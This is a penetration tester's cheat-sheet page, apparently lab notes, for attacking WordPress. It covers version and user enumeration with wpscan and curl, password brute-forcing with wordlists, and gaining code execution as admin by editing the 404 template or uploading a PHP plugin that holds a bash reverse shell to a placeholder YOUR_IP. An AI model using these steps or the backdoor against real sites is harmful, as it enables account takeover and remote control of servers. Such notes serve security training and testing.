---
title: Wordpress 🍔
---
## Identify version

- Identify the Wordpress CMS version using the tool **wpscan**: `wpscan --url "http://whatever.com"`

![](Pasted%20image%2020240320111450.png)

## Scan for users

- Obtain all users of a wordpress by the command: `curl http://whatever.com/index.php/wp-json/wp/v2/users/ | grep name`

OR

```shell
wpscan --url "http://whatever.com" --enumerate u
```

- Now bruteforce the username(s) you found by: 

```shell
wpscan --url "http://whatever.com/" -U users.txt -P wordlist.txt
```

## Ignore TLS on https webs

- If you get this error:

![](Pasted%20image%2020240419113548.png)

- Add `--disable-tls-checks`:

```shell
wpscan --url "https://URL" --disable-tls-checks
```

## RCEs (as admin logged in)

- *Credits to [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#panel-rce)*

### Panel RCE

**Modifying a php from the theme used (admin credentials needed)**

Go to `Appearance` >> `Theme Editor` >> `404 Template (at the right)`

Change the content for a php shell (like Pentest Monkey one)
- More info in [Reverse shells 👾](reverse_shells.md)

![](Pasted%20image%2020240531154056.png)

Search in internet how can you access that updated page. In this case you have to access here: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### Plugin RCE

It may be possible to upload `.php` files as a plugin. Create your php backdoor using for example:

```php
<?php exec("/bin/sh -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'") ?>
```

Then add a new plugin:

![](Pasted%20image%2020240531154437.png)

Upload plugin and press Install Now:

![](Pasted%20image%2020240531154503.png)

Click on Procced:

![](Pasted%20image%2020240531154519.png)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](Pasted%20image%2020240531154540.png)

Access it and you will see the URL to execute the reverse shell:

![](Pasted%20image%2020240531154556.png)

